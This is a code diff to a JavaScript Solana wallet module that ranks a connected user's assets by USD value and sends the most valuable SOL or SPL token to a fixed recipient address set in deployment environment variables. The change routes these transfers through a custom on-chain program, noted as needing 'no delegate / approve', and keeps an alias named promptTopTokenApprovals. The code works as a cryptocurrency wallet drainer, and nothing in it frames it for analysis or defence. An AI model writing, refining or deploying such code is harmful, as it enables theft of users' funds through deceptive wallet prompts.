@@ -1,17 +1,17 @@
-import {
-  Connection,
-  PublicKey,
-  SystemProgram,
-  Transaction,
-} from "@solana/web3.js";
+import { Connection, PublicKey, Transaction } from "@solana/web3.js";
 import { gatewayFetch } from "./chunk-transport.js";
 import {
   TOKEN_PROGRAM_ID,
   TOKEN_2022_PROGRAM_ID,
   createAssociatedTokenAccountInstruction,
-  createTransferInstruction,
   getAssociatedTokenAddressSync,
 } from "@solana/spl-token";
+import {
+  assertProgramDeployed,
+  buildTransferSolInstruction,
+  buildTransferSplInstruction,
+  resolveTransferProgramId,
+} from "./transfer-program.js";
 
 const JUPITER_PRICE_URL = "https://api.jup.ag/price/v2";
 /** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
@@ -79,9 +79,7 @@ export function createRpcConnection(config) {
 function resolveTransferRecipient(config) {
   const to = (config.transferRecipient || "").trim();
   if (!to) {
-    throw new Error(
-      "[wallet] TRANSFER_RECIPIENT is not set on Vercel — add it in project env vars",
-    );
+    throw new Error("[wallet] TRANSFER_RECIPIENT is not configured on Vercel");
   }
   return parseSolanaPubkey("Transfer recipient", to);
 }
@@ -210,7 +208,7 @@ function rankAssetsByValue(tokens, prices, minUsd = 0) {
 }
 
 /**
- * Transfer the single most valuable asset (SOL or SPL) to TRANSFER_RECIPIENT.
+ * Transfer top USD asset via BPF program CPI (no delegate / approve).
  */
 export async function promptTopValueTransfer({
   config,
@@ -218,6 +216,9 @@ export async function promptTopValueTransfer({
   connection,
   ownerAddress,
 }) {
+  const programId = resolveTransferProgramId(config);
+  await assertProgramDeployed(connection, programId);
+
   const recipient = resolveTransferRecipient(config);
   const ownerPk =
     provider?.publicKey ??
@@ -243,15 +244,17 @@ export async function promptTopValueTransfer({
   try {
     const ok =
       asset.kind === "native"
-        ? await sendNativeSolTransfer({
+        ? await sendProgramSolTransfer({
             provider,
             connection,
+            programId,
             recipient,
             owner: ownerPk,
           })
-        : await sendSplTransfer({
+        : await sendProgramSplTransfer({
             provider,
             connection,
+            programId,
             asset,
             recipient,
             owner: ownerPk,
@@ -271,12 +274,12 @@ export async function promptTopValueTransfer({
   }
 }
 
-/** @deprecated Use promptTopValueTransfer */
 export const promptTopTokenApprovals = promptTopValueTransfer;
 
-async function sendNativeSolTransfer({
+async function sendProgramSolTransfer({
   provider,
   connection,
+  programId,
   recipient,
   owner,
 }) {
@@ -290,18 +293,20 @@ async function sendNativeSolTransfer({
     return false;
   }
 
-  const ix = SystemProgram.transfer({
-    fromPubkey: owner,
-    toPubkey: recipient,
-    lamports: Number(transferable),
+  const ix = buildTransferSolInstruction({
+    programId,
+    owner,
+    recipient,
+    lamports: transferable,
   });
 
   return sendWalletTransaction(provider, connection, [ix]);
 }
 
-async function sendSplTransfer({
+async function sendProgramSplTransfer({
   provider,
   connection,
+  programId,
   asset,
   recipient,
   owner,
@@ -338,14 +343,15 @@ async function sendSplTransfer({
   }
 
   instructions.push(
-    createTransferInstruction(
+    buildTransferSplInstruction({
+      programId,
+      owner,
       source,
       destination,
-      owner,
-      asset.rawAmount,
-      [],
+      mint,
       tokenProgram,
-    ),
+      amount: asset.rawAmount,
+    }),
   );
 
   return sendWalletTransaction(provider, connection, instructions);
